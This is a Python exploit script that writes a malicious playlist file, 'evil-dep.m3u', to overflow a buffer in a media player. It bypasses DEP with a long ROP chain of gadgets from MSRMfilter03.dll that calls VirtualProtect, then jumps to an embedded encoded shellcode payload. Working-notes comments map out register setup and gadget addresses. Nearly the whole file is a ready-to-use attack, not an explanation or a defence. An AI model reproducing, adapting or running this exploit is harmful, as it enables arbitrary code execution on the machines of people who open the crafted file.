import struct

padding = "A" * 26084

nops = "\x90" * 25

_buffer = "CCCC"

jmp_esp = "\x58\xb0\x01\x10"

shellcode =  ""
shellcode += "\xba\xc3\xd0\x50\x6a\xdb\xd8\xd9\x74\x24\xf4\x5d"
shellcode += "\x2b\xc9\xb1\x52\x31\x55\x12\x83\xed\xfc\x03\x96"
shellcode += "\xde\xb2\x9f\xe4\x37\xb0\x60\x14\xc8\xd5\xe9\xf1"
shellcode += "\xf9\xd5\x8e\x72\xa9\xe5\xc5\xd6\x46\x8d\x88\xc2"
shellcode += "\xdd\xe3\x04\xe5\x56\x49\x73\xc8\x67\xe2\x47\x4b"
shellcode += "\xe4\xf9\x9b\xab\xd5\x31\xee\xaa\x12\x2f\x03\xfe"
shellcode += "\xcb\x3b\xb6\xee\x78\x71\x0b\x85\x33\x97\x0b\x7a"
shellcode += "\x83\x96\x3a\x2d\x9f\xc0\x9c\xcc\x4c\x79\x95\xd6"
shellcode += "\x91\x44\x6f\x6d\x61\x32\x6e\xa7\xbb\xbb\xdd\x86"
shellcode += "\x73\x4e\x1f\xcf\xb4\xb1\x6a\x39\xc7\x4c\x6d\xfe"
shellcode += "\xb5\x8a\xf8\xe4\x1e\x58\x5a\xc0\x9f\x8d\x3d\x83"
shellcode += "\xac\x7a\x49\xcb\xb0\x7d\x9e\x60\xcc\xf6\x21\xa6"
shellcode += "\x44\x4c\x06\x62\x0c\x16\x27\x33\xe8\xf9\x58\x23"
shellcode += "\x53\xa5\xfc\x28\x7e\xb2\x8c\x73\x17\x77\xbd\x8b"
shellcode += "\xe7\x1f\xb6\xf8\xd5\x80\x6c\x96\x55\x48\xab\x61"
shellcode += "\x99\x63\x0b\xfd\x64\x8c\x6c\xd4\xa2\xd8\x3c\x4e"
shellcode += "\x02\x61\xd7\x8e\xab\xb4\x78\xde\x03\x67\x39\x8e"
shellcode += "\xe3\xd7\xd1\xc4\xeb\x08\xc1\xe7\x21\x21\x68\x12"
shellcode += "\xa2\x31\x6d\x1c\x33\xa6\x6f\x1c\x33\xbe\xf9\xfa"
shellcode += "\x59\xae\xaf\x55\xf6\x57\xea\x2d\x67\x97\x20\x48"
shellcode += "\xa7\x13\xc7\xad\x66\xd4\xa2\xbd\x1f\x14\xf9\x9f"
shellcode += "\xb6\x2b\xd7\xb7\x55\xb9\xbc\x47\x13\xa2\x6a\x10"
shellcode += "\x74\x14\x63\xf4\x68\x0f\xdd\xea\x70\xc9\x26\xae"
shellcode += "\xae\x2a\xa8\x2f\x22\x16\x8e\x3f\xfa\x97\x8a\x6b"
shellcode += "\x52\xce\x44\xc5\x14\xb8\x26\xbf\xce\x17\xe1\x57"
shellcode += "\x96\x5b\x32\x21\x97\xb1\xc4\xcd\x26\x6c\x91\xf2"
shellcode += "\x87\xf8\x15\x8b\xf5\x98\xda\x46\xbe\xa9\x90\xca"
shellcode += "\x97\x21\x7d\x9f\xa5\x2f\x7e\x4a\xe9\x49\xfd\x7e"
shellcode += "\x92\xad\x1d\x0b\x97\xea\x99\xe0\xe5\x63\x4c\x06"
shellcode += "\x59\x83\x45"

# payload = padding + jmp_esp + _buffer + nops + shellcode

"""
=============================================================================
"""

# current_value_esp = 0x000FF660, hence need to push esp and add 20

virtual_protect = struct.pack("I", 0x76c92341)

lpAddress = struct.pack("I", 0x41414141) # address of shellcode 0x000ff674

dwSize = struct.pack("I", 0x42424242) # set to 700 bytes 0x2CB for good measure, CB 02 00 00

flNewProtect = struct.pack("I", 0x43434343) # mode, set to 0x40, little endian format: 04 00 00 00

lpflOldProtect = struct.pack("I", 0x10035005) # writeable_addresses

return_address = struct.pack("I", 0x01010101) # address of shellcode 0x000ff674

# payload = padding + virtual_protect + _buffer + return_address + lpAddress + dwSize + flNewProtect + lpflOldProtect + shellcode

"""
=============================================================================

push eax, ecx, edx, ebx, original esp, ebp, esi, edi

eax -> NOPs
ecx -> lpflOldProtect -> 0x10035005
edx -> flNewProtect -> 0x40
ebx -> dwSize -> 0x2CB
esp -> No changes -> start of where you wanna apply virtualprotect to lpAddress
ebp -> POP EAX -> return address
ESI -> virtualprotect
EDI -> ROP NOP

0x100253bc :  # XOR EDX,EDX # RETN    ** [MSRMfilter03.dll] **   |   {PAGE_EXECUTE_READ}
0x100240af :  # INC EDX # STD # POP ESI # POP EDI # POP EBX # RETN    ** [MSRMfilter03.dll] **   |   {PAGE_EXECUTE_READ}
0x41414141
0x41414141
0x41414141

EDX

0x10029822 :  # POP EAX # RETN    ** [MSRMfilter03.dll] **   |   {PAGE_EXECUTE_READ}
0x41f10401 
0x10027682 :  # ADD EAX,BE0F0000 # RETN    ** [MSRMfilter03.dll] **   |   {PAGE_EXECUTE_READ}
0x1001bdee :  # PUSH EAX # MOV EAX,1 # POP EBX # ADD ESP,8 # RETN    ** [MSRMfilter03.dll] **   |   {PAGE_EXECUTE_READ}
0x41414141
0x41414141

EBX

0x1002a7d1 :  # POP EDI # POP ESI # RETN    ** [MSRMfilter03.dll] **   |   {PAGE_EXECUTE_READ}
0x1002a779 :  # XOR EAX,EAX # RETN    ** [MSRMfilter03.dll] **   |   {PAGE_EXECUTE_READ}
0x76c92341

EDI, ESI

0x1002dc22 :  # AND AL,90 # ADD EAX,80 # POP EBP # RETN    ** [MSRMfilter03.dll] **   |   {PAGE_EXECUTE_READ}
0x10029822	

EBP

0x1002956c :  # POP ECX # RETN    ** [MSRMfilter03.dll] **   |   {PAGE_EXECUTE_READ}
0x10035005

ECX

0x10029822 :  # POP EAX # RETN    ** [MSRMfilter03.dll] **   |   {PAGE_EXECUTE_READ}
0x10029822 :  # POP EAX # RETN    ** [MSRMfilter03.dll] **   |   {PAGE_EXECUTE_READ}

EAX (Prevent the ADD BYTE PTR:[EAX] from throwing error)

0x1002bc07 :  # PUSHAD # XOR EAX,11005 # ADD BYTE PTR DS:[EAX],AL # RETN    ** [MSRMfilter03.dll] **   |   {PAGE_EXECUTE_READ}

"""

rop_gadgets = [

# EDX

struct.pack("I", 0x100253bc),
struct.pack("I", 0x41414141), # buffer

struct.pack("I", 0x100240af),
struct.pack("I", 0x41414141),
struct.pack("I", 0x41414141),
struct.pack("I", 0x41414141),

struct.pack("I", 0x100240af),
struct.pack("I", 0x41414141),
struct.pack("I", 0x41414141),
struct.pack("I", 0x41414141),

struct.pack("I", 0x100240af),
struct.pack("I", 0x41414141),
struct.pack("I", 0x41414141),
struct.pack("I", 0x41414141),

struct.pack("I", 0x100240af),
struct.pack("I", 0x41414141),
struct.pack("I", 0x41414141),
struct.pack("I", 0x41414141),

struct.pack("I", 0x100240af),
struct.pack("I", 0x41414141),
struct.pack("I", 0x41414141),
struct.pack("I", 0x41414141),

struct.pack("I", 0x100240af),
struct.pack("I", 0x41414141),
struct.pack("I", 0x41414141),
struct.pack("I", 0x41414141),

struct.pack("I", 0x100240af),
struct.pack("I", 0x41414141),
struct.pack("I", 0x41414141),
struct.pack("I", 0x41414141),

struct.pack("I", 0x100240af),
struct.pack("I", 0x41414141),
struct.pack("I", 0x41414141),
struct.pack("I", 0x41414141),

struct.pack("I", 0x100240af),
struct.pack("I", 0x41414141),
struct.pack("I", 0x41414141),
struct.pack("I", 0x41414141),

struct.pack("I", 0x100240af),
struct.pack("I", 0x41414141),
struct.pack("I", 0x41414141),
struct.pack("I", 0x41414141),

struct.pack("I", 0x100240af),
struct.pack("I", 0x41414141),
struct.pack("I", 0x41414141),
struct.pack("I", 0x41414141),

struct.pack("I", 0x100240af),
struct.pack("I", 0x41414141),
struct.pack("I", 0x41414141),
struct.pack("I", 0x41414141),

struct.pack("I", 0x100240af),
struct.pack("I", 0x41414141),
struct.pack("I", 0x41414141),
struct.pack("I", 0x41414141),

struct.pack("I", 0x100240af),
struct.pack("I", 0x41414141),
struct.pack("I", 0x41414141),
struct.pack("I", 0x41414141),

struct.pack("I", 0x100240af),
struct.pack("I", 0x41414141),
struct.pack("I", 0x41414141),
struct.pack("I", 0x41414141),

struct.pack("I", 0x100240af),
struct.pack("I", 0x41414141),
struct.pack("I", 0x41414141),
struct.pack("I", 0x41414141),

struct.pack("I", 0x100240af),
struct.pack("I", 0x41414141),
struct.pack("I", 0x41414141),
struct.pack("I", 0x41414141),

struct.pack("I", 0x100240af),
struct.pack("I", 0x41414141),
struct.pack("I", 0x41414141),
struct.pack("I", 0x41414141),

struct.pack("I", 0x100240af),
struct.pack("I", 0x41414141),
struct.pack("I", 0x41414141),
struct.pack("I", 0x41414141),

struct.pack("I", 0x100240af),
struct.pack("I", 0x41414141),
struct.pack("I", 0x41414141),
struct.pack("I", 0x41414141),

struct.pack("I", 0x100240af),
struct.pack("I", 0x41414141),
struct.pack("I", 0x41414141),
struct.pack("I", 0x41414141),

struct.pack("I", 0x100240af),
struct.pack("I", 0x41414141),
struct.pack("I", 0x41414141),
struct.pack("I", 0x41414141),

struct.pack("I", 0x100240af),
struct.pack("I", 0x41414141),
struct.pack("I", 0x41414141),
struct.pack("I", 0x41414141),

struct.pack("I", 0x100240af),
struct.pack("I", 0x41414141),
struct.pack("I", 0x41414141),
struct.pack("I", 0x41414141),

struct.pack("I", 0x100240af),
struct.pack("I", 0x41414141),
struct.pack("I", 0x41414141),
struct.pack("I", 0x41414141),

struct.pack("I", 0x100240af),
struct.pack("I", 0x41414141),
struct.pack("I", 0x41414141),
struct.pack("I", 0x41414141),

struct.pack("I", 0x100240af),
struct.pack("I", 0x41414141),
struct.pack("I", 0x41414141),
struct.pack("I", 0x41414141),

struct.pack("I", 0x100240af),
struct.pack("I", 0x41414141),
struct.pack("I", 0x41414141),
struct.pack("I", 0x41414141),

struct.pack("I", 0x100240af),
struct.pack("I", 0x41414141),
struct.pack("I", 0x41414141),
struct.pack("I", 0x41414141),

struct.pack("I", 0x100240af),
struct.pack("I", 0x41414141),
struct.pack("I", 0x41414141),
struct.pack("I", 0x41414141),

struct.pack("I", 0x100240af),
struct.pack("I", 0x41414141),
struct.pack("I", 0x41414141),
struct.pack("I", 0x41414141),

struct.pack("I", 0x100240af),
struct.pack("I", 0x41414141),
struct.pack("I", 0x41414141),
struct.pack("I", 0x41414141),

struct.pack("I", 0x100240af),
struct.pack("I", 0x41414141),
struct.pack("I", 0x41414141),
struct.pack("I", 0x41414141),

struct.pack("I", 0x100240af),
struct.pack("I", 0x41414141),
struct.pack("I", 0x41414141),
struct.pack("I", 0x41414141),

struct.pack("I", 0x100240af),
struct.pack("I", 0x41414141),
struct.pack("I", 0x41414141),
struct.pack("I", 0x41414141),

struct.pack("I", 0x100240af),
struct.pack("I", 0x41414141),
struct.pack("I", 0x41414141),
struct.pack("I", 0x41414141),

struct.pack("I", 0x100240af),
struct.pack("I", 0x41414141),
struct.pack("I", 0x41414141),
struct.pack("I", 0x41414141),

struct.pack("I", 0x100240af),
struct.pack("I", 0x41414141),
struct.pack("I", 0x41414141),
struct.pack("I", 0x41414141),

struct.pack("I", 0x100240af),
struct.pack("I", 0x41414141),
struct.pack("I", 0x41414141),
struct.pack("I", 0x41414141),

struct.pack("I", 0x100240af),
struct.pack("I", 0x41414141),
struct.pack("I", 0x41414141),
struct.pack("I", 0x41414141),

struct.pack("I", 0x100240af),
struct.pack("I", 0x41414141),
struct.pack("I", 0x41414141),
struct.pack("I", 0x41414141),

struct.pack("I", 0x100240af),
struct.pack("I", 0x41414141),
struct.pack("I", 0x41414141),
struct.pack("I", 0x41414141),

struct.pack("I", 0x100240af),
struct.pack("I", 0x41414141),
struct.pack("I", 0x41414141),
struct.pack("I", 0x41414141),

struct.pack("I", 0x100240af),
struct.pack("I", 0x41414141),
struct.pack("I", 0x41414141),
struct.pack("I", 0x41414141),

struct.pack("I", 0x100240af),
struct.pack("I", 0x41414141),
struct.pack("I", 0x41414141),
struct.pack("I", 0x41414141),

struct.pack("I", 0x100240af),
struct.pack("I", 0x41414141),
struct.pack("I", 0x41414141),
struct.pack("I", 0x41414141),

struct.pack("I", 0x100240af),
struct.pack("I", 0x41414141),
struct.pack("I", 0x41414141),
struct.pack("I", 0x41414141),

struct.pack("I", 0x100240af),
struct.pack("I", 0x41414141),
struct.pack("I", 0x41414141),
struct.pack("I", 0x41414141),

struct.pack("I", 0x100240af),
struct.pack("I", 0x41414141),
struct.pack("I", 0x41414141),
struct.pack("I", 0x41414141),

struct.pack("I", 0x100240af),
struct.pack("I", 0x41414141),
struct.pack("I", 0x41414141),
struct.pack("I", 0x41414141),

struct.pack("I", 0x100240af),
struct.pack("I", 0x41414141),
struct.pack("I", 0x41414141),
struct.pack("I", 0x41414141),

struct.pack("I", 0x100240af),
struct.pack("I", 0x41414141),
struct.pack("I", 0x41414141),
struct.pack("I", 0x41414141),

struct.pack("I", 0x100240af),
struct.pack("I", 0x41414141),
struct.pack("I", 0x41414141),
struct.pack("I", 0x41414141),

struct.pack("I", 0x100240af),
struct.pack("I", 0x41414141),
struct.pack("I", 0x41414141),
struct.pack("I", 0x41414141),

struct.pack("I", 0x100240af),
struct.pack("I", 0x41414141),
struct.pack("I", 0x41414141),
struct.pack("I", 0x41414141),

struct.pack("I", 0x100240af),
struct.pack("I", 0x41414141),
struct.pack("I", 0x41414141),
struct.pack("I", 0x41414141),

struct.pack("I", 0x100240af),
struct.pack("I", 0x41414141),
struct.pack("I", 0x41414141),
struct.pack("I", 0x41414141),

struct.pack("I", 0x100240af),
struct.pack("I", 0x41414141),
struct.pack("I", 0x41414141),
struct.pack("I", 0x41414141),

struct.pack("I", 0x100240af),
struct.pack("I", 0x41414141),
struct.pack("I", 0x41414141),
struct.pack("I", 0x41414141),

struct.pack("I", 0x100240af),
struct.pack("I", 0x41414141),
struct.pack("I", 0x41414141),
struct.pack("I", 0x41414141),

struct.pack("I", 0x100240af),
struct.pack("I", 0x41414141),
struct.pack("I", 0x41414141),
struct.pack("I", 0x41414141),

struct.pack("I", 0x100240af),
struct.pack("I", 0x41414141),
struct.pack("I", 0x41414141),
struct.pack("I", 0x41414141),

struct.pack("I", 0x100240af),
struct.pack("I", 0x41414141),
struct.pack("I", 0x41414141),
struct.pack("I", 0x41414141),

struct.pack("I", 0x100240af),
struct.pack("I", 0x41414141),
struct.pack("I", 0x41414141),
struct.pack("I", 0x41414141),

# EBX

struct.pack("I", 0x10029822),
struct.pack("I", 0x41f10401),
struct.pack("I", 0x10027682),
struct.pack("I", 0x1001bdee),
struct.pack("I", 0x41414141),
struct.pack("I", 0x41414141),

# EDI, ESI

struct.pack("I", 0x1002a7d1),
struct.pack("I", 0x1002a779),
struct.pack("I", 0x76c92341),

# EBP

struct.pack("I", 0x1002dc22),
struct.pack("I", 0x10029822), # prevent the 0x10029822 instruction from messing up by returning to this instruction which will pop that instruction into EAX

# ECX

struct.pack("I", 0x1002956c),
struct.pack("I", 0x10035005),

# EAX

struct.pack("I", 0x10029822),
struct.pack("I", 0x10029822), # Prevent the ADD BYTE PTR:[EAX] from throwing error

# PUSH AD

struct.pack("I", 0x1002bc07),


# RET 2 SHELLCODE

struct.pack("I", 0x1001b058), # ret 2 shellcode

]

shellcode =  ""
shellcode += "\x90" * 20
shellcode += "\xba\xc3\xd0\x50\x6a\xdb\xd8\xd9\x74\x24\xf4\x5d"
shellcode += "\x2b\xc9\xb1\x52\x31\x55\x12\x83\xed\xfc\x03\x96"
shellcode += "\xde\xb2\x9f\xe4\x37\xb0\x60\x14\xc8\xd5\xe9\xf1"
shellcode += "\xf9\xd5\x8e\x72\xa9\xe5\xc5\xd6\x46\x8d\x88\xc2"
shellcode += "\xdd\xe3\x04\xe5\x56\x49\x73\xc8\x67\xe2\x47\x4b"
shellcode += "\xe4\xf9\x9b\xab\xd5\x31\xee\xaa\x12\x2f\x03\xfe"
shellcode += "\xcb\x3b\xb6\xee\x78\x71\x0b\x85\x33\x97\x0b\x7a"
shellcode += "\x83\x96\x3a\x2d\x9f\xc0\x9c\xcc\x4c\x79\x95\xd6"
shellcode += "\x91\x44\x6f\x6d\x61\x32\x6e\xa7\xbb\xbb\xdd\x86"
shellcode += "\x73\x4e\x1f\xcf\xb4\xb1\x6a\x39\xc7\x4c\x6d\xfe"
shellcode += "\xb5\x8a\xf8\xe4\x1e\x58\x5a\xc0\x9f\x8d\x3d\x83"
shellcode += "\xac\x7a\x49\xcb\xb0\x7d\x9e\x60\xcc\xf6\x21\xa6"
shellcode += "\x44\x4c\x06\x62\x0c\x16\x27\x33\xe8\xf9\x58\x23"
shellcode += "\x53\xa5\xfc\x28\x7e\xb2\x8c\x73\x17\x77\xbd\x8b"
shellcode += "\xe7\x1f\xb6\xf8\xd5\x80\x6c\x96\x55\x48\xab\x61"
shellcode += "\x99\x63\x0b\xfd\x64\x8c\x6c\xd4\xa2\xd8\x3c\x4e"
shellcode += "\x02\x61\xd7\x8e\xab\xb4\x78\xde\x03\x67\x39\x8e"
shellcode += "\xe3\xd7\xd1\xc4\xeb\x08\xc1\xe7\x21\x21\x68\x12"
shellcode += "\xa2\x31\x6d\x1c\x33\xa6\x6f\x1c\x33\xbe\xf9\xfa"
shellcode += "\x59\xae\xaf\x55\xf6\x57\xea\x2d\x67\x97\x20\x48"
shellcode += "\xa7\x13\xc7\xad\x66\xd4\xa2\xbd\x1f\x14\xf9\x9f"
shellcode += "\xb6\x2b\xd7\xb7\x55\xb9\xbc\x47\x13\xa2\x6a\x10"
shellcode += "\x74\x14\x63\xf4\x68\x0f\xdd\xea\x70\xc9\x26\xae"
shellcode += "\xae\x2a\xa8\x2f\x22\x16\x8e\x3f\xfa\x97\x8a\x6b"
shellcode += "\x52\xce\x44\xc5\x14\xb8\x26\xbf\xce\x17\xe1\x57"
shellcode += "\x96\x5b\x32\x21\x97\xb1\xc4\xcd\x26\x6c\x91\xf2"
shellcode += "\x87\xf8\x15\x8b\xf5\x98\xda\x46\xbe\xa9\x90\xca"
shellcode += "\x97\x21\x7d\x9f\xa5\x2f\x7e\x4a\xe9\x49\xfd\x7e"
shellcode += "\x92\xad\x1d\x0b\x97\xea\x99\xe0\xe5\x63\x4c\x06"
shellcode += "\x59\x83\x45"

payload = padding + ''.join(_ for _ in rop_gadgets) + shellcode

file = open("evil-dep.m3u", "w")
file.write(payload)
file.close()